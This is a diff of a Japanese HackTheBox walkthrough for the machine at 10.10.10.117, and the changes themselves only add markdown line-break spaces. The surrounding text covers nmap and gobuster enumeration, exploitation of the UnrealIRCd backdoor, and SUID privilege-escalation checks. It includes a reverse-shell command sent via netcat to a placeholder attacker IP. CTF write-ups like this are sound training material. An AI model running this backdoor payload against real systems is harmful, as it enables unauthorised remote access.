@@ -1,7 +1,7 @@
 # はじめに
 HackTheBoxの攻略などを自分用にまとめたものです。
-主に記録用として記しています。
-<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">
+主に記録用として記しています。  
+<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
 GitHub(ペネトレーションテスト用チートシート):
 https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
 Twitter:@yukitsukai1731
@@ -65,7 +65,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Aug 20 11:12:01 2020 -- 1 IP address (1 host up) scanned in 2486.92 seconds
 ```
 
-この結果から80番ポートが空いていることが分かります。
+この結果から80番ポートが空いていることが分かります。  
 ブラウザからアクセスしてみると以下のような画像が表示されます。
 ![コメント 2020-08-20 233320.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/dcf927d6-388b-c7ab-89e9-217f0bd1ff37.png)
 
@@ -87,7 +87,7 @@ gobuster dir -u http://10.10.10.117 -w /usr/share/wordlists/dirbuster/directory-
 ```
 
 # UnrealIRCd
-6697,8067,65534番ポートではircのデーモンであるUnrealIRCdが稼働しています。
+6697,8067,65534番ポートではircのデーモンであるUnrealIRCdが稼働しています。  
 UnrealIRCdに繋ぐために、今回はhexchatを使用します。
 
 ```
@@ -134,7 +134,7 @@ exploit
 ![コメント 2020-08-21 143957.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9254eba5-a3e1-7e58-e436-dffc2076d724.png)
 
 ## 手動でのエクスプロイト
-「AB」で始まるサーバに送信されたコマンドが直接system()に渡されるというものなので、今回それを利用します。
+「AB」で始まるサーバに送信されたコマンドが直接system()に渡されるというものなので、今回それを利用します。  
 下記の画像のようにコマンドをnetcatを通じて送信することでシェルを取得することができました。
 
 ```
@@ -144,10 +144,10 @@ echo "AB; bash -c 'bash -i >& /dev/tcp/<attacker ip><attacker port> 0>&1'" | nc 
 ![コメント 2020-08-21 191135.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/162531fb-d5d3-dfb5-eede-70e07c35c151.png)
 
 ## Lateral movement(横展開)
-ircdのユーザは手に入れることができましたが、user.txtを開くことはできませんでした。
-そこでuser.txtの所有者であるdjmardovというユーザでアクセスできるようにしたいと思います。
+ircdのユーザは手に入れることができましたが、user.txtを開くことはできませんでした。  
+そこでuser.txtの所有者であるdjmardovというユーザでアクセスできるようにしたいと思います。  
 ls -laコマンドの結果、user.txtと並んで.backupというファイルが配置されていました。
-内容を見てみると何かのパスワードのようです。
+内容を見てみると何かのパスワードのようです。  
 またstegというsteganographyを彷彿させるような記述があります。
 ![コメント 2020-08-21 144625.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b0bb4518-70af-8cce-75f9-40924eaeb420.png)
 
@@ -184,7 +184,7 @@ chmod 755 linpeas.sh
 ```
 
 ![コメント 2020-08-21 153251.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/f9e8e929-97ea-4ac0-93c6-a95a2f01ec76.png)
-ここではSUIDをチェックします。
+ここではSUIDをチェックします。  
 Linuxでは、SUIDアクセス許可を持つファイルはより高い特権で実行することができます。root以外のユーザーとしてアクセスし、suidビットが有効なバイナリが見つかったとするとそれらのファイル・プログラム・コマンドはroot権限で実行することができます。
 ![コメント 2020-08-21 154000.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d049e44c-7870-0ea9-f21c-29c997b91c4e.png)
 中でも、/usr/bin/viewuserというものが気になるので実行してみます。
